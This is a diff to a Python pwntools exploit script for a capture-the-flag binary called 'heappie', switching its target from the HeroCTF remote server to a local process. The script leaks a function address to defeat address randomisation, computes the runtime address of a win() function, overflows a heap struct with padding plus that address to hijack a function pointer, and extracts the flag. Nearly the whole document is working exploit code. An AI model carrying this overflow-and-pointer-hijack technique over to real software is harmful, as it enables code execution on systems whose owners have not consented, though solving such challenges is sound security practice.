@@ -1,11 +1,10 @@
 #!/home/kali/.venv/bin/python3
-
-from pwn import *
+from pwn import ELF, remote, context, process, p64
 import re
 
 exe = './heappie'
-elf = ELF(exe, checksec=False)
-p = remote('pwn.heroctf.fr', 6000)
+elf = context.binary = ELF(exe, checksec=False)
+p = process(exe)
 
 win_offset = elf.symbols['win']
 
@@ -21,51 +20,54 @@ p.sendline(b'4')
 
 # collect data to parse it
 data = p.recv(8192*10).decode()
-data += p.recv(8192*10).decode()
-data += p.recv(8192*10).decode()
-print(f"###\ndata received: {data}\n###")
 
-# look for pattern using re.search(pattern, string, flags=0)
+# collect the leaked address
 matches = re.search('song: (0x[0-9A-Fa-f]+)', data)
-print(f"matches: type: {type(matches)}, value: {matches}")
-# Match: object returned by successful matches and searches.
 matches = str(matches.group(0))[6:]
 
-# getting global play_1 addr:
 if matches:
     play_1_addr = int(matches, 16)
-    print(f"leaked play_1_addr: {hex(play_1_addr)}")
+    print(f"play_1_addr: {hex(play_1_addr)}")
 else:
     print("found nothing")
-
 
 # getting win_runtime_addr:
 play_1_offset = elf.symbols['play_1']
 print(f"play_1_offset: {hex(play_1_offset)}")
 
-base_addr = play_1_addr - play_1_offset
-print(f"base_addr: {hex(base_addr)}")
+elf_base_addr = play_1_addr - play_1_offset
+print(f"elf_base_addr: {hex(elf_base_addr)}")
 
-win_runtime_addr = base_addr + win_offset
+win_runtime_addr = elf_base_addr + win_offset
 print(f"win_runtime_addr: {hex(win_runtime_addr)}")
 
-
-# overflowing struct:
+# overflowing second struct:
 p.sendline(b'1')
 p.sendline(b'n')
 p.sendline(b'play_2')
 p.sendline(b'1')
 p.sendline(b'A' * 128 + p64(win_runtime_addr))
 
-# struct containing p64(win_runtime_addr)
+# third struct containing p64(win_runtime_addr)
 p.sendline(b'1')
 p.sendline(b'n')
 p.sendline(b'play_3')
 p.sendline(b'2')
 p.sendline(b'eeee')
 
-# now play_3 contains the win runtime address
-p.sendline(b'2')
+# now play_3 contains the win runtime address so lets play it:
+p.sendline(b'2') 
 p.sendline(b'2')
 
-p.interactive()
+# grabbing the flag:
+data = p.recv(8192).decode()
+matches = re.search(r'Hero\{[^}]+\}', data)
+matches = str(matches.group(0))
+
+if matches:
+    flag = matches
+    print(f'flag found: {flag}')
+else:
+    print('flag not found')
+
+p.close()
